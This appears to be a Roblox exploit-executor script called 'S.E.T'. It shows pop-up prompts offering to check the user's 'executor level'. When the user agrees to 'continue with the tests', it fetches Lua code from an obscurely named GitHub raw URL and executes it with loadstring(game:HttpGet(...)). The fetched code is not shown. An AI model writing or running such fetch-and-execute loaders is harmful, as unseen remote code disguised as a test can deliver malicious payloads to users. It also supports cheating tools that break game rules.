local StarterGui = game:GetService("StarterGui")

-- Function to handle executor level selection
local function onLevelSelected(buttonPressed)
    if buttonPressed == "Yes" then
        -- Run the loadstring when "Level 3 Or Lower" is pressed
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/s4n8m2k6q1h9j7v5t3f2r9p7y2g8l3w6x7z9v5/s9r3v5k7t1f2n9l7y2g8q4m6p8z1x3w7b9j2v5/refs/heads/main/tester.lua", true))()
        end)

        if not success then
            warn("Error running script: " .. err)
        end

    elseif buttonPressed == "No" then
        -- Run the loadstring when "Level 4 Or Higher" is pressed
        print("tests canceled.")
    end
end

-- Function to handle first notification
local function onFirstNotificationPressed(buttonPressed)
    if buttonPressed == "Yes" then
        game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
        for i = 1, 50 do print("") end
        printidentity()
        print("level checked successfully. please wait this console will close automatically after 6 seconds")
        wait(6)
        game:GetService("StarterGui"):SetCore("DevConsoleVisible", false)
        local LevelNotification = Instance.new("BindableFunction")
        LevelNotification.OnInvoke = onLevelSelected
        
        StarterGui:SetCore("SendNotification", {
            Title = "S.E.T",
            Text = "Do You Want To Continue With The Rest Of The Tests?",
            Duration = 100,
            Button1 = "Yes",
            Button2 = "No",
            Callback = LevelNotification
        })
    elseif buttonPressed == "No" then
        local LevelNotification = Instance.new("BindableFunction")
        LevelNotification.OnInvoke = onLevelSelected
        
        StarterGui:SetCore("SendNotification", {
            Title = "S.E.T",
            Text = "Do You Want To Continue With The Rest Of The Tests?",
            Duration = 100,
            Button1 = "Yes",
            Button2 = "No",
            Callback = LevelNotification
        })
    end
end

-- Create BindableFunction for the first notification
local FirstNotification = Instance.new("BindableFunction")
FirstNotification.OnInvoke = onFirstNotificationPressed

-- Show the first notification
StarterGui:SetCore("SendNotification", {
    Title = "S.E.T",
    Text = "Want To Check Your Executor's Level?",
    Duration = 100,
    Button1 = "Yes",
    Button2 = "No",
    Callback = FirstNotification
})
